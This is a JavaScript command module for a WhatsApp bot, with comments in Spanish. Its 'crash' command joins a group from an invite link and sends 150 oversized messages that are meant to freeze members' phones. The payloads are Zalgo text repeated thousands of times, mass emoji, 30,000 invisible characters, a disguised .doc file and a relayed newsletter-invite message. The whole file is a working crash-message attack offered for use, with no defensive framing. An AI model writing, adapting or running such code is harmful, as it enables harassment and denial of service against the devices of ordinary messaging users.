export default {
  name: ["crash"],
  description: "Traba un grupo: une el bot y le suelta una ráfaga de mensajes pesados",
  category: 'owner',
  ownerOnly: true,

  async run({ sock, from, text, cmdName, reply }) {
    if (!text || !text.includes('whatsapp.com')) {
      return reply({ text: `😿 Pásame el enlace del grupo.\nEjemplo: .${cmdName} https://chat.whatsapp.com/XXXX` });
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
    if (!match) return reply({ text: '😡 Enlace inválido.' });
    const code = match[1];

    let groupId;
    try {
      groupId = (await sock.groupGetInviteInfo(code)).id;
    } catch {
      return reply({ text: '⚠️ No pude leer el grupo. Enlace inválido o expirado.' });
    }

    // Si el bot no está dentro, entra. Si ya está, no pasa nada.
    try { await sock.groupAcceptInvite(code); } catch {}

    // === Payloads pesados y VISIBLES en Android ===
    const UP   = '\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309\u030A\u030B\u030C\u030D\u030E\u030F';
    const DOWN = '\u0316\u0317\u0318\u0319\u031A\u031B\u031C\u031D\u031E\u031F\u0320\u0321\u0322\u0323\u0324\u0325';
    const zalgo = (b, n) => { let s = b; for (let i = 0; i < n; i++) s += UP[i % 16] + DOWN[i % 16]; return s; };

    const ZALGO  = zalgo('A', 6).repeat(4000);                 // letras apiladas (se ven)
    const EMOJI  = '😭🔥💀👻🤖💥🌟🍕🚀🎉😂😍😱🥶🤯👽🎃🧠🍀⚡🌈🐉🦖🌋🎯🥵😵‍💫🫠👾🤡🦄🍩☠️🎸🏆💎🧨🔮🪐🌙⭐🎈🥳🤩😎'.repeat(600);
    const OCULTO = '\u200E'.repeat(30000);                     // texto bomba invisible

    const THUMB = Buffer.from(
      '/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==',
      'base64'
    );

    // Rota 5 tipos distintos: peso + spam, sin repetir seguido el mismo patrón
    const builds = [
      () => sock.sendMessage(groupId, { text: ZALGO }),
      () => sock.sendMessage(groupId, { text: EMOJI }),
      () => sock.sendMessage(groupId, { text: OCULTO }),
      () => sock.sendMessage(groupId, {
        document: Buffer.from(OCULTO),
        fileName: 'ado 🔥.doc',
        mimetype: 'application/msword',
        caption: ZALGO,
      }),
      () => sock.relayMessage(groupId, {
        newsletterAdminInviteMessage: {
          newsletterJid: '120363229729656123@newsletter',
          newsletterName: 'ADOi' + zalgo('A', 6).repeat(2000),
          jpegThumbnail: THUMB,
          caption: ZALGO,
          inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`,
        },
      }, {}),
    ];

    // Config fija del ataque
    const total = 150;
    const delayMs = 700;

    await reply({ text: `💥 Traba lanzada → ${groupId}\n> ${total} mensajes pesados · ~${Math.round((total * delayMs) / 1000)}s` });

    for (let i = 0; i < total; i++) {
      try {
        await builds[i % builds.length]();
      } catch {
        // si un envío falla, sigue con el resto
      }
      await new Promise((r) => setTimeout(r, delayMs));
    }

    await reply({ text: `✅ ${total} mensajes lanzados a ${groupId}.` });
  },
};